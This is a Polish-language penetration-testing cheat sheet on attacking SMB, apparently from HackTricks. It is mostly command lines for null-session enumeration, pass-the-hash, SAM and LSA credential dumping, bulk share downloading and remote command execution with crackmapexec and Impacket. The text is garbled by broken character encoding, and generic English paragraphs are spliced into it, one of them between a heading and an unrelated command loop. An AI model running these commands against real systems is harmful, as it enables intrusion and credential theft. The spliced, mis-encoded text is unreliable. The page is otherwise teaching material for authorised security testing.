# 139,445 - Testowanie penetracyjne SMB

<details>

<summary><strong>Naucz siÄ™ hakowaÄ‡ AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* JeÅ›li chcesz zobaczyÄ‡ swojÄ… **firmÄ™ reklamowanÄ… w HackTricks** lub **pobraÄ‡ HackTricks w formacie PDF**, sprawdÅº [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* ZdobÄ…dÅº [**oficjalne gadÅ¼ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**RodzinÄ™ PEASS**](https://opensea.io/collection/the-peass-family), naszÄ… kolekcjÄ™ ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **DoÅ‚Ä…cz do** ğŸ’¬ [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **Å›ledÅº** nas na **Twitterze** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel siÄ™ swoimi sztuczkami hakerskimi, przesyÅ‚ajÄ…c PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

## **Port 139**

**_Network Basic Input Output System_ (NetBIOS)** to protokÃ³Å‚ oprogramowania zaprojektowany do umoÅ¼liwienia aplikacjom, komputerom i pulpitom w ramach lokalnej sieci LAN interakcji z sprzÄ™tem sieciowym i **uÅ‚atwienia transmisji danych w sieci**. Identyfikacja i lokalizacja aplikacji oprogramowania dziaÅ‚ajÄ…cych w sieci NetBIOS sÄ… osiÄ…gane za pomocÄ… ich nazw NetBIOS, ktÃ³re mogÄ… mieÄ‡ maksymalnie 16 znakÃ³w i czÄ™sto rÃ³Å¼niÄ… siÄ™ od nazwy komputera. Sesja NetBIOS miÄ™dzy dwiema aplikacjami jest inicjowana, gdy jedna aplikacja (dziaÅ‚ajÄ…ca jako klient) wydaje polecenie "wywoÅ‚aj" innÄ… aplikacjÄ™ (dziaÅ‚ajÄ…cÄ… jako serwer), korzystajÄ…c z **Portu TCP 139**.
```
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
```
## Port 445

Technicznie rzecz biorÄ…c, Port 139 jest okreÅ›lany jako 'NBT over IP', podczas gdy Port 445 jest identyfikowany jako 'SMB over IP'. SkrÃ³t **SMB** oznacza '**Server Message Blocks**', ktÃ³ry jest rÃ³wnieÅ¼ znany jako **Common Internet File System (CIFS)**. Jako protokÃ³Å‚ sieciowy warstwy aplikacji, SMB/CIFS jest gÅ‚Ã³wnie wykorzystywany do udostÄ™pniania wspÃ³lnego dostÄ™pu do plikÃ³w, drukarek, portÃ³w szeregowych oraz uÅ‚atwiania rÃ³Å¼nych form komunikacji miÄ™dzy wÄ™zÅ‚ami w sieci.

Na przykÅ‚ad, w kontekÅ›cie systemu Windows, zaznacza siÄ™, Å¼e SMB moÅ¼e dziaÅ‚aÄ‡ bezpoÅ›rednio nad TCP/IP, eliminujÄ…c koniecznoÅ›Ä‡ korzystania z NetBIOS nad TCP/IP, poprzez wykorzystanie portu 445. Natomiast na innych systemach obserwuje siÄ™ uÅ¼ycie portu 139, co wskazuje na wykonanie SMB w poÅ‚Ä…czeniu z NetBIOS nad TCP/IP.
```
445/tcp   open  microsoft-ds  Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
```
### SMB

ProtokÃ³Å‚ **Server Message Block (SMB)**, dziaÅ‚ajÄ…cy w modelu **klient-serwer**, zostaÅ‚ zaprojektowany do regulowania **dostÄ™pu do plikÃ³w**, katalogÃ³w oraz innych zasobÃ³w sieciowych, takich jak drukarki i routery. GÅ‚Ã³wnie wykorzystywany w serii systemÃ³w operacyjnych **Windows**, SMB zapewnia kompatybilnoÅ›Ä‡ wstecznÄ…, umoÅ¼liwiajÄ…c urzÄ…dzeniom z nowszymi wersjami systemu operacyjnego Microsoftu bezproblemowÄ… interakcjÄ™ z tymi, ktÃ³re dziaÅ‚ajÄ… na starszych wersjach. Dodatkowo, projekt **Samba** oferuje bezpÅ‚atne oprogramowanie, umoÅ¼liwiajÄ…ce implementacjÄ™ SMB na systemach **Linux** i Unix, uÅ‚atwiajÄ…c tym samym komunikacjÄ™ miÄ™dzyplatformowÄ… za pomocÄ… SMB.

UdziaÅ‚y, reprezentujÄ…ce **dowolne czÄ™Å›ci lokalnego systemu plikÃ³w**, mogÄ… byÄ‡ udostÄ™pniane przez serwer SMB, co sprawia, Å¼e hierarchia jest widoczna dla klienta czÄ™Å›ciowo **niezaleÅ¼nie** od rzeczywistej struktury serwera. **Listy kontroli dostÄ™pu (ACL)**, ktÃ³re definiujÄ… **prawa dostÄ™pu**, umoÅ¼liwiajÄ… **dokÅ‚adnÄ… kontrolÄ™** nad uprawnieniami uÅ¼ytkownikÃ³w, w tym atrybutami takimi jak **`execute`**, **`read`** i **`full access`**. Te uprawnienia mogÄ… byÄ‡ przypisane do poszczegÃ³lnych uÅ¼ytkownikÃ³w lub grup, na podstawie udziaÅ‚Ã³w, i sÄ… odrÄ™bne od lokalnych uprawnieÅ„ ustawionych na serwerze.

### UdziaÅ‚ IPC$

DostÄ™p do udziaÅ‚u IPC$ moÅ¼na uzyskaÄ‡ za pomocÄ… anonimowej sesji null, umoÅ¼liwiajÄ…c interakcjÄ™ z usÅ‚ugami udostÄ™pnianymi za pomocÄ… nazwanych potokÃ³w. NarzÄ™dzie `enum4linux` jest przydatne w tym celu. Poprawnie wykorzystane, umoÅ¼liwia zdobycie:

- Informacji o systemie operacyjnym
- SzczegÃ³Å‚Ã³w dotyczÄ…cych domeny nadrzÄ™dnej
- Kompilacji lokalnych uÅ¼ytkownikÃ³w i grup
- Informacji o dostÄ™pnych udziaÅ‚ach SMB
- Efektywnej polityki bezpieczeÅ„stwa systemu

Ta funkcjonalnoÅ›Ä‡ jest kluczowa dla administratorÃ³w sieci i profesjonalistÃ³w ds. bezpieczeÅ„stwa w celu oceny stanu bezpieczeÅ„stwa usÅ‚ug SMB (Server Message Block) w sieci. `enum4linux` zapewnia wszechstronne spojrzenie na Å›rodowisko SMB systemu docelowego, co jest niezbÄ™dne do identyfikacji potencjalnych podatnoÅ›ci i zapewnienia odpowiedniego zabezpieczenia usÅ‚ug SMB.
```bash
enum4linux -a target_ip
```
PowyÅ¼sza komenda jest przykÅ‚adem, jak moÅ¼na uÅ¼yÄ‡ `enum4linux` do przeprowadzenia peÅ‚nej enumeracji na celu okreÅ›lonym przez `target_ip`.


## Co to jest NTLM

JeÅ›li nie wiesz, czym jest NTLM lub chcesz dowiedzieÄ‡ siÄ™, jak dziaÅ‚a i jak go wykorzystaÄ‡, z pewnoÅ›ciÄ… zainteresuje CiÄ™ ta strona na temat **NTLM**, gdzie wyjaÅ›niono, **jak dziaÅ‚a ten protokÃ³Å‚ i jak moÅ¼na z niego skorzystaÄ‡:**

{% content-ref url="../windows-hardening/ntlm/" %}
[ntlm](../windows-hardening/ntlm/)
{% endcontent-ref %}

## **Enumeracja serwera**

### **Skanowanie** sieci w poszukiwaniu hostÃ³w:
```bash
nbtscan -r 192.168.0.1/24
```
### Wersja serwera SMB

Aby szukaÄ‡ moÅ¼liwych podatnoÅ›ci w wersji SMB, waÅ¼ne jest, aby wiedzieÄ‡, ktÃ³ra wersja jest uÅ¼ywana. JeÅ›li ta informacja nie pojawia siÄ™ w innych uÅ¼ywanych narzÄ™dziach, moÅ¼na:

* UÅ¼yÄ‡ moduÅ‚u pomocniczego **MSF** \_**auxiliary/scanner/smb/smb\_version**
* Lub ten skrypt:
```bash
#!/bin/sh
#Author: rewardone
#Description:
# Requires root or enough permissions to use tcpdump
# Will listen for the first 7 packets of a null login
# and grab the SMB Version
#Notes:
# Will sometimes not capture or will print multiple
# lines. May need to run a second time for success.
if [ -z $1 ]; then echo "Usage: ./smbver.sh RHOST {RPORT}" && exit; else rhost=$1; fi
if [ ! -z $2 ]; then rport=$2; else rport=139; fi
tcpdump -s0 -n -i tap0 src $rhost and port $rport -A -c 7 2>/dev/null | grep -i "samba\|s.a.m" | tr -d '.' | grep -oP 'UnixSamba.*[0-9a-z]' | tr -d '\n' & echo -n "$rhost: " &
echo "exit" | smbclient -L $rhost 1>/dev/null 2>/dev/null
echo "" && sleep .1
```
### **Wyszukiwanie eksploitÃ³w**

To find exploits for a specific vulnerability, you can use various online resources such as exploit databases, security forums, and vulnerability databases. These resources provide a collection of known exploits that can be used to exploit specific vulnerabilities in target systems.

To search for exploits, you can use search engines like Google or specialized search tools like searchsploit. By using specific search queries, you can narrow down your search and find relevant exploits.

When searching for exploits, it is important to consider the version of the software or service you are targeting. Exploits are often specific to certain versions, so make sure to include the version number in your search query.

Remember that using exploits without proper authorization is illegal and unethical. Always ensure that you have the necessary permissions and legal rights before attempting to use any exploits.
```bash
msf> search type:exploit platform:windows target:2008 smb
searchsploit microsoft smb
```
### **MoÅ¼liwe** dane uwierzytelniajÄ…ce

| **Nazwa uÅ¼ytkownika** | **Powszechne hasÅ‚a**                      |
| -------------------- | ----------------------------------------- |
| _(puste)_            | _(puste)_                                 |
| goÅ›Ä‡                 | _(puste)_                                 |
| Administrator, admin | _(puste)_, hasÅ‚o, administrator, admin    |
| arcserve             | arcserve, backup                          |
| tivoli, tmersrvd     | tivoli, tmersrvd, admin                   |
| backupexec, backup   | backupexec, backup, arcada                |
| test, lab, demo      | hasÅ‚o, test, lab, demo                    |

### Atak siÅ‚owy

* [**Atak siÅ‚owy na SMB**](../generic-methodologies-and-resources/brute-force.md#smb)

### Informacje o Å›rodowisku SMB

### Uzyskanie informacji
```bash
#Dump interesting information
enum4linux -a [-u "<username>" -p "<passwd>"] <IP>
enum4linux-ng -A [-u "<username>" -p "<passwd>"] <IP>
nmap --script "safe or smb-enum-*" -p 445 <IP>

#Connect to the rpc
rpcclient -U "" -N <IP> #No creds
rpcclient //machine.htb -U domain.local/USERNAME%754d87d42adabcca32bdb34a876cbffb  --pw-nt-hash
rpcclient -U "username%passwd" <IP> #With creds
#You can use querydispinfo and enumdomusers to query user information

#Dump user information
/usr/share/doc/python3-impacket/examples/samrdump.py -port 139 [[domain/]username[:password]@]<targetName or address>
/usr/share/doc/python3-impacket/examples/samrdump.py -port 445 [[domain/]username[:password]@]<targetName or address>

#Map possible RPC endpoints
/usr/share/doc/python3-impacket/examples/rpcdump.py -port 135 [[domain/]username[:password]@]<targetName or address>
/usr/share/doc/python3-impacket/examples/rpcdump.py -port 139 [[domain/]username[:password]@]<targetName or address>
/usr/share/doc/python3-impacket/examples/rpcdump.py -port 445 [[domain/]username[:password]@]<targetName or address>
```
### Wyliczanie uÅ¼ytkownikÃ³w, grup i zalogowanych uÅ¼ytkownikÃ³w

Te informacje powinny byÄ‡ juÅ¼ zbierane za pomocÄ… narzÄ™dzi enum4linux i enum4linux-ng.
```bash
crackmapexec smb 10.10.10.10 --users [-u <username> -p <password>]
crackmapexec smb 10.10.10.10 --groups [-u <username> -p <password>]
crackmapexec smb 10.10.10.10 --groups --loggedon-users [-u <username> -p <password>]

ldapsearch -x -b "DC=DOMAIN_NAME,DC=LOCAL" -s sub "(&(objectclass=user))" -h 10.10.10.10 | grep -i samaccountname: | cut -f 2 -d " "

rpcclient -U "" -N 10.10.10.10
enumdomusers
enumdomgroups
```
### Wyliczanie lokalnych uÅ¼ytkownikÃ³w

[Impacket](https://github.com/fortra/impacket/blob/master/examples/lookupsid.py)
```bash
lookupsid.py -no-pass hostname.local
```
Pentesting SMB
==============

SMB (Server Message Block) is a network protocol used for file sharing, printer sharing, and communication between devices in a network. It is commonly used in Windows operating systems.

SMB Enumeration
----------------

SMB enumeration is the process of gathering information about SMB shares, users, and groups on a target system. This information can be used to identify potential vulnerabilities and misconfigurations.

To enumerate SMB shares, you can use tools like `smbclient`, `smbmap`, or `enum4linux`. These tools allow you to connect to an SMB server and list the available shares.

To enumerate users and groups, you can use tools like `rpcclient` or `enum4linux`. These tools allow you to query the SMB server for information about users and groups.

SMB Exploitation
----------------

Once you have identified potential vulnerabilities or misconfigurations, you can proceed with SMB exploitation. There are several techniques that can be used to exploit SMB, including:

- **Brute forcing**: This involves attempting to guess the username and password for an SMB share. Tools like `hydra` or `medusa` can be used for this purpose.

- **SMB relay**: This technique involves intercepting SMB traffic and relaying it to another target. This can be used to gain unauthorized access to a target system. Tools like `Responder` or `ntlmrelayx` can be used for SMB relay attacks.

- **SMB signing downgrade**: This technique involves downgrading the SMB signing level to allow for the interception and modification of SMB traffic. Tools like `impacket` can be used for this purpose.

- **SMB command injection**: This technique involves injecting malicious commands into an SMB request to execute arbitrary code on a target system. This can be used to gain remote code execution. Tools like `Metasploit` or `Empire` can be used for SMB command injection.

SMB Post-Exploitation
---------------------

Once you have successfully exploited an SMB vulnerability, you can proceed with post-exploitation activities. These activities may include:

- **Privilege escalation**: This involves escalating your privileges on the target system to gain higher levels of access. Techniques like `token impersonation` or `exploiting weak service permissions` can be used for privilege escalation.

- **Data exfiltration**: This involves stealing sensitive data from the target system. Tools like `smbclient` or `copy` command can be used to copy files from the target system to your local machine.

- **Persistence**: This involves maintaining access to the target system even after a reboot or system update. Techniques like `creating a backdoor user` or `modifying startup scripts` can be used for persistence.

- **Lateral movement**: This involves moving laterally within the network to gain access to other systems. Techniques like `pass-the-hash` or `pass-the-ticket` can be used for lateral movement.

SMB Security Best Practices
---------------------------

To secure SMB services, it is recommended to follow these best practices:

- **Disable SMBv1**: SMBv1 is an outdated and insecure version of the SMB protocol. It is recommended to disable SMBv1 and use newer versions like SMBv2 or SMBv3.

- **Enable SMB signing**: SMB signing helps to ensure the integrity and authenticity of SMB traffic. It is recommended to enable SMB signing to prevent tampering and unauthorized access.

- **Use strong authentication**: It is recommended to use strong authentication mechanisms like NTLMv2 or Kerberos for SMB authentication.

- **Implement access controls**: It is recommended to implement proper access controls to restrict access to SMB shares and resources.

- **Regularly update and patch**: It is important to regularly update and patch SMB servers to protect against known vulnerabilities.

- **Monitor SMB traffic**: Monitoring SMB traffic can help to detect and prevent unauthorized access and suspicious activities.

- **Disable guest access**: It is recommended to disable guest access to prevent unauthorized access to SMB shares.

- **Encrypt SMB traffic**: Encrypting SMB traffic using protocols like SMB over SSL/TLS (SMB3 encryption) can help to protect sensitive data from eavesdropping.

- **Implement network segmentation**: Implementing network segmentation can help to isolate SMB services from other critical systems and reduce the impact of a potential compromise.

- **Regularly backup data**: Regularly backing up data can help to recover from a potential ransomware attack or data loss.

- **Educate users**: It is important to educate users about the risks associated with SMB and the importance of following security best practices.
```bash
for i in $(seq 500 1100);do rpcclient -N -U "" 10.10.10.10 -c "queryuser 0x$(printf '%x\n' $i)" | grep "User Name\|user_rid\|group_rid" && echo "";done
```
### Metasploit - Wyliczanie lokalnych uÅ¼ytkownikÃ³w

Metasploit to potÄ™Å¼ne narzÄ™dzie do testowania penetracyjnego, ktÃ³re moÅ¼na wykorzystaÄ‡ do wyliczania lokalnych uÅ¼ytkownikÃ³w w systemie. PoniÅ¼ej przedstawiono kroki, ktÃ³re naleÅ¼y podjÄ…Ä‡, aby to osiÄ…gnÄ…Ä‡:

1. Uruchom Metasploit Framework, wpisujÄ…c polecenie `msfconsole` w terminalu.

2. Wybierz odpowiedni moduÅ‚ do wyliczania lokalnych uÅ¼ytkownikÃ³w, wpisujÄ…c polecenie `use windows/smb_enumusers`.

3. Skonfiguruj wymagane opcje, takie jak `RHOSTS` (adres IP docelowego systemu) i `RPORT` (port SMB). MoÅ¼esz to zrobiÄ‡, wpisujÄ…c polecenie `set RHOSTS <adres_IP>` i `set RPORT <port>`.

4. Uruchom moduÅ‚, wpisujÄ…c polecenie `run`.

Metasploit przeprowadzi teraz skanowanie systemu w poszukiwaniu lokalnych uÅ¼ytkownikÃ³w. Wyniki zostanÄ… wyÅ›wietlone na ekranie, zawierajÄ…c informacje takie jak nazwa uÅ¼ytkownika, SID (Security Identifier) i grupy, do ktÃ³rych naleÅ¼y uÅ¼ytkownik.

To narzÄ™dzie jest niezwykle przydatne podczas testowania penetracyjnego, poniewaÅ¼ umoÅ¼liwia identyfikacjÄ™ potencjalnych luk w zabezpieczeniach systemu. PamiÄ™taj jednak, Å¼e wykorzystywanie Metasploit do celÃ³w nielegalnych lub bez zgody wÅ‚aÅ›ciciela systemu jest nielegalne i nieetyczne.
```bash
use auxiliary/scanner/smb/smb_lookupsid
set rhosts hostname.local
run
```
### **Wyliczanie LSARPC i SAMR rpcclient**

{% content-ref url="pentesting-smb/rpcclient-enumeration.md" %}
[rpcclient-enumeration.md](pentesting-smb/rpcclient-enumeration.md)
{% endcontent-ref %}

### PoÅ‚Ä…czenie GUI z systemem Linux

#### W terminalu:

`xdg-open smb://cascade.htb/`

#### W oknie przeglÄ…darki plikÃ³w (nautilus, thunar, itp.)

`smb://friendzone.htb/general/`

## Wyliczanie udostÄ™pnionych folderÃ³w

### WyÅ›wietlanie udostÄ™pnionych folderÃ³w

Zawsze zaleca siÄ™ sprawdzenie, czy moÅ¼na uzyskaÄ‡ dostÄ™p do czegokolwiek. JeÅ›li nie masz poÅ›wiadczeÅ„, sprÃ³buj uÅ¼yÄ‡ **pustych poÅ›wiadczeÅ„/uÅ¼ytkownika goÅ›cia**.
```bash
smbclient --no-pass -L //<IP> # Null user
smbclient -U 'username[%passwd]' -L [--pw-nt-hash] //<IP> #If you omit the pwd, it will be prompted. With --pw-nt-hash, the pwd provided is the NT hash

smbmap -H <IP> [-P <PORT>] #Null user
smbmap -u "username" -p "password" -H <IP> [-P <PORT>] #Creds
smbmap -u "username" -p "<NT>:<LM>" -H <IP> [-P <PORT>] #Pass-the-Hash
smbmap -R -u "username" -p "password" -H <IP> [-P <PORT>] #Recursive list

crackmapexec smb <IP> -u '' -p '' --shares #Null user
crackmapexec smb <IP> -u 'username' -p 'password' --shares #Guest user
crackmapexec smb <IP> -u 'username' -H '<HASH>' --shares #Guest user
```
To connect to a shared folder on a remote machine, you can use the `smbclient` tool. This tool allows you to interact with SMB (Server Message Block) shares.

To connect to a shared folder, use the following command:

```plaintext
smbclient //<IP_ADDRESS>/<SHARE_NAME> -U <USERNAME>
```

Replace `<IP_ADDRESS>` with the IP address of the remote machine and `<SHARE_NAME>` with the name of the shared folder you want to connect to. Additionally, replace `<USERNAME>` with a valid username on the remote machine.

Once connected, you can use various commands to interact with the shared folder. For example, you can use the `ls` command to list the contents of the shared folder:

```plaintext
ls
```

This will display a list of files and directories in the shared folder.

Remember to provide valid credentials (username and password) when prompted to authenticate with the remote machine.
```bash
#Connect using smbclient
smbclient --no-pass //<IP>/<Folder>
smbclient -U 'username[%passwd]' -L [--pw-nt-hash] //<IP> #If you omit the pwd, it will be prompted. With --pw-nt-hash, the pwd provided is the NT hash
#Use --no-pass -c 'recurse;ls'  to list recursively with smbclient

#List with smbmap, without folder it list everything
smbmap [-u "username" -p "password"] -R [Folder] -H <IP> [-P <PORT>] # Recursive list
smbmap [-u "username" -p "password"] -r [Folder] -H <IP> [-P <PORT>] # Non-Recursive list
smbmap -u "username" -p "<NT>:<LM>" [-r/-R] [Folder] -H <IP> [-P <PORT>] #Pass-the-Hash
```
### **RÄ™czne wyliczanie udziaÅ‚Ã³w systemu Windows i Å‚Ä…czenie siÄ™ z nimi**

MoÅ¼e siÄ™ zdarzyÄ‡, Å¼e masz ograniczone uprawnienia do wyÅ›wietlania udziaÅ‚Ã³w na maszynie docelowej i gdy prÃ³bujesz je wymieniÄ‡, wydaje siÄ™, Å¼e nie ma Å¼adnych udziaÅ‚Ã³w, do ktÃ³rych moÅ¼na siÄ™ podÅ‚Ä…czyÄ‡. Warto w takim przypadku sprÃ³bowaÄ‡ rÄ™cznie poÅ‚Ä…czyÄ‡ siÄ™ z udziaÅ‚em. Aby rÄ™cznie wyliczyÄ‡ udziaÅ‚y, warto szukaÄ‡ odpowiedzi takich jak NT\_STATUS\_ACCESS\_DENIED i NT\_STATUS\_BAD\_NETWORK\_NAME, gdy uÅ¼ywasz waÅ¼nej sesji (np. pustej sesji lub waÅ¼nych poÅ›wiadczeÅ„). MogÄ… one wskazywaÄ‡, czy udziaÅ‚ istnieje i nie masz do niego dostÄ™pu, czy teÅ¼ udziaÅ‚ w ogÃ³le nie istnieje.

WspÃ³lne nazwy udziaÅ‚Ã³w dla celÃ³w systemÃ³w Windows to:

* C$
* D$
* ADMIN$
* IPC$
* PRINT$
* FAX$
* SYSVOL
* NETLOGON

(WspÃ³lne nazwy udziaÅ‚Ã³w z ksiÄ…Å¼ki _**Network Security Assessment 3rd edition**_)

MoÅ¼esz sprÃ³bowaÄ‡ poÅ‚Ä…czyÄ‡ siÄ™ z nimi, uÅ¼ywajÄ…c nastÄ™pujÄ…cej komendy:
```bash
smbclient -U '%' -N \\\\<IP>\\<SHARE> # null session to connect to a windows share
smbclient -U '<USER>' \\\\<IP>\\<SHARE> # authenticated session to connect to a windows share (you will be prompted for a password)
```
lub ten skrypt (korzystajÄ…cy z sesji null)
```bash
#/bin/bash

ip='<TARGET-IP-HERE>'
shares=('C$' 'D$' 'ADMIN$' 'IPC$' 'PRINT$' 'FAX$' 'SYSVOL' 'NETLOGON')

for share in ${shares[*]}; do
output=$(smbclient -U '%' -N \\\\$ip\\$share -c '')

if [[ -z $output ]]; then
echo "[+] creating a null session is possible for $share" # no output if command goes through, thus assuming that a session was created
else
echo $output # echo error message (e.g. NT_STATUS_ACCESS_DENIED or NT_STATUS_BAD_NETWORK_NAME)
fi
done
```
PrzykÅ‚ady
```bash
smbclient -U '%' -N \\\\192.168.0.24\\im_clearly_not_here # returns NT_STATUS_BAD_NETWORK_NAME
smbclient -U '%' -N \\\\192.168.0.24\\ADMIN$ # returns NT_STATUS_ACCESS_DENIED or even gives you a session
```
### **Wyliczanie udziaÅ‚Ã³w z systemu Windows / bez uÅ¼ycia narzÄ™dzi innych firm**

PowerShell
```powershell
# Retrieves the SMB shares on the locale computer.
Get-SmbShare
Get-WmiObject -Class Win32_Share
# Retrieves the SMB shares on a remote computer.
get-smbshare -CimSession "<computer name or session object>"
# Retrieves the connections established from the local SMB client to the SMB servers.
Get-SmbConnection
```
Konsola CMD
```shell
# List shares on the local computer
net share
# List shares on a remote computer (including hidden ones)
net view \\<ip> /all
```
MMC Snap-in (graficzny)
```shell
# Shared Folders: Shared Folders > Shares
fsmgmt.msc
# Computer Management: Computer Management > System Tools > Shared Folders > Shares
compmgmt.msc
```
explorer.exe (graficzny), wpisz `\\<ip>\`, aby zobaczyÄ‡ dostÄ™pne nieukryte udziaÅ‚y.

### Zamontuj udostÄ™pniony folder
```bash
mount -t cifs //x.x.x.x/share /mnt/share
mount -t cifs -o "username=user,password=password" //x.x.x.x/share /mnt/share
```
### **Pobieranie plikÃ³w**

Przeczytaj poprzednie sekcje, aby dowiedzieÄ‡ siÄ™, jak poÅ‚Ä…czyÄ‡ siÄ™ za pomocÄ… poÅ›wiadczeÅ„/Pass-the-Hash.
```bash
#Search a file and download
sudo smbmap -R Folder -H <IP> -A <FileName> -q # Search the file in recursive mode and download it inside /usr/share/smbmap
```

```bash
#Download all
smbclient //<IP>/<share>
> mask ""
> recurse
> prompt
> mget *
#Download everything to current directory
```
Polecenia:

* mask: okreÅ›la maskÄ™, ktÃ³ra jest uÅ¼ywana do filtrowania plikÃ³w w katalogu (np. "" dla wszystkich plikÃ³w)
* recurse: przeÅ‚Ä…cza rekursjÄ™ (domyÅ›lnie: wyÅ‚Ä…czone)
* prompt: wyÅ‚Ä…cza pytanie o nazwy plikÃ³w (domyÅ›lnie: wÅ‚Ä…czone)
* mget: kopiuje wszystkie pliki pasujÄ…ce do maski z hosta na maszynÄ™ klienta

(_Informacje z manpage smbclient_)

### Wyszukiwanie udostÄ™pnionych folderÃ³w domenowych

* [**Snaffler**](https://github.com/SnaffCon/Snaffler)\*\*\*\*
```bash
Snaffler.exe -s -d domain.local -o snaffler.log -v data
```
* [**CrackMapExec**](https://wiki.porchetta.industries/smb-protocol/spidering-shares) - pajÄ…k.
* `-M spider_plus [--share <nazwa_udziaÅ‚u>]`
* `--pattern txt`
```bash
sudo crackmapexec smb 10.10.10.10 -u username -p pass -M spider_plus --share 'Department Shares'
```
SzczegÃ³lnie interesujÄ…ce sÄ… pliki o nazwie **`Registry.xml`**, poniewaÅ¼ **mogÄ… zawieraÄ‡ hasÅ‚a** dla uÅ¼ytkownikÃ³w skonfigurowanych z **autologonem** za pomocÄ… Group Policy. Lub pliki **`web.config`**, poniewaÅ¼ zawierajÄ… poÅ›wiadczenia.

{% hint style="info" %}
UdziaÅ‚ **SYSVOL** jest **odczytywalny** przez wszystkich uwierzytelnionych uÅ¼ytkownikÃ³w w domenie. W nim moÅ¼esz **znaleÅºÄ‡** wiele rÃ³Å¼nych skryptÃ³w wsadowych, VBScript i PowerShell.\
PowinieneÅ› **sprawdziÄ‡** skrypty wewnÄ…trz, poniewaÅ¼ moÅ¼esz **znaleÅºÄ‡** wraÅ¼liwe informacje, takie jak **hasÅ‚a**.
{% endhint %}

## Odczytaj rejestr

MoÅ¼esz prÃ³bowaÄ‡ **odczytaÄ‡ rejestr** za pomocÄ… odkrytych poÅ›wiadczeÅ„. NarzÄ™dzie Impacket **`reg.py`** pozwala na to:
```bash
sudo reg.py domain.local/USERNAME@MACHINE.htb -hashes 1a3487d42adaa12332bdb34a876cb7e6:1a3487d42adaa12332bdb34a876cb7e6 query -keyName HKU -s
sudo reg.py domain.local/USERNAME@MACHINE.htb -hashes 1a3487d42adaa12332bdb34a876cb7e6:1a3487d42adaa12332bdb34a876cb7e6 query -keyName HKCU -s
sudo reg.py domain.local/USERNAME@MACHINE.htb -hashes 1a3487d42adaa12332bdb34a876cb7e6:1a3487d42adaa12332bdb34a876cb7e6 query -keyName HKLM -s
```
## Post Eksploatacja

DomyÅ›lna konfiguracja serwera **Samba** zazwyczaj znajduje siÄ™ w `/etc/samba/smb.conf` i moÅ¼e zawieraÄ‡ niebezpieczne ustawienia:

| **Ustawienie**              | **Opis**                                                            |
| --------------------------- | ------------------------------------------------------------------- |
| `browseable = yes`          | Czy moÅ¼na wyÅ›wietlaÄ‡ dostÄ™pne udziaÅ‚y w bieÅ¼Ä…cym udziale?            |
| `read only = no`            | Czy zabroniÄ‡ tworzenia i modyfikowania plikÃ³w?                        |
| `writable = yes`            | Czy zezwoliÄ‡ uÅ¼ytkownikom na tworzenie i modyfikowanie plikÃ³w?        |
| `guest ok = yes`            | Czy zezwoliÄ‡ na poÅ‚Ä…czenie z usÅ‚ugÄ… bez uÅ¼ycia hasÅ‚a?                 |
| `enable privileges = yes`   | Czy uwzglÄ™dniÄ‡ przywileje przypisane do okreÅ›lonego SID?              |
| `create mask = 0777`        | Jakie uprawnienia majÄ… byÄ‡ przypisane do nowo utworzonych plikÃ³w?    |
| `directory mask = 0777`     | Jakie uprawnienia majÄ… byÄ‡ przypisane do nowo utworzonych katalogÃ³w? |
| `logon script = script.sh`  | Jaki skrypt ma byÄ‡ uruchomiony podczas logowania uÅ¼ytkownika?         |
| `magic script = script.sh`  | Jaki skrypt powinien byÄ‡ uruchomiony po zamkniÄ™ciu skryptu?           |
| `magic output = script.out` | Gdzie naleÅ¼y przechowywaÄ‡ wynik magicznego skryptu?                   |

Polecenie `smbstatus` dostarcza informacji o **serwerze** i o **podÅ‚Ä…czonych uÅ¼ytkownikach**.

## Uwierzytelnianie za pomocÄ… Kerberos

MoÅ¼esz **uwierzytelniÄ‡** siÄ™ do **Kerberosa** za pomocÄ… narzÄ™dzi **smbclient** i **rpcclient**:
```bash
smbclient --kerberos //ws01win10.domain.com/C$
rpcclient -k ws01win10.domain.com
```
## **Wykonuj polecenia**

### **crackmapexec**

crackmapexec moÅ¼e wykonywaÄ‡ polecenia, **wykorzystujÄ…c** dowolnÄ… z metod **mmcexec, smbexec, atexec, wmiexec**, przy czym domyÅ›lnÄ… metodÄ… jest **wmiexec**. MoÅ¼esz wskazaÄ‡, ktÃ³rÄ… opcjÄ™ chcesz uÅ¼yÄ‡ za pomocÄ… parametru `--exec-method`:
```bash
apt-get install crackmapexec

crackmapexec smb 192.168.10.11 -u Administrator -p 'P@ssw0rd' -X '$PSVersionTable' #Execute Powershell
crackmapexec smb 192.168.10.11 -u Administrator -p 'P@ssw0rd' -x whoami #Excute cmd
crackmapexec smb 192.168.10.11 -u Administrator -H <NTHASH> -x whoami #Pass-the-Hash
# Using --exec-method {mmcexec,smbexec,atexec,wmiexec}

crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --sam #Dump SAM
crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --lsa #Dump LSASS in memmory hashes
crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --sessions #Get sessions (
crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --loggedon-users #Get logged-on users
crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --disks #Enumerate the disks
crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --users #Enumerate users
crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --groups # Enumerate groups
crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --local-groups # Enumerate local groups
crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --pass-pol #Get password policy
crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --rid-brute #RID brute

crackmapexec smb <IP> -d <DOMAIN> -u Administrator -H <HASH> #Pass-The-Hash
```
### [**psexec**](../windows-hardening/ntlm/psexec-and-winexec.md)**/**[**smbexec**](../windows-hardening/ntlm/smbexec.md)

